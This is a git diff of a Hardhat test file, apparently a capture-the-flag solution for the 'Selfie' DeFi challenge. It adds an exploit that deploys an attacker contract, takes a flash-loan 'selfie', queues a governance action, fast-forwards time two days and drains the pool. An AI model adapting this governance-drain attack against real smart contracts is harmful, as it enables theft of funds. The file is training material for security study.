@@ -1,7 +1,7 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 
-describe('[Challenge] Selfie', function () {
+describe.only('[Challenge] Selfie', function () {
     let deployer, attacker;
 
     const TOKEN_INITIAL_SUPPLY = ethers.utils.parseEther('2000000'); // 2 million tokens
@@ -31,6 +31,19 @@ describe('[Challenge] Selfie', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const Attacker = await ethers.getContractFactory("AttackerSelfie",attacker);
+        const attackerContract = await Attacker.deploy(this.pool.address,this.governance.address,this.token.address);
+        tx = await attackerContract.connect(attacker).takeSelfie();
+        await tx.wait();
+        tx = await attackerContract.connect(attacker).queueActionToDrain();
+        await tx.wait();
+        const DAY = 1000*60*60*24;
+        await network.provider.request({
+            method: 'evm_increaseTime',
+            params: [2*DAY],
+          });
+        tx = await attackerContract.connect(attacker).drainAfterDelay();
+        await tx.wait();
     });
 
     after(async function () {
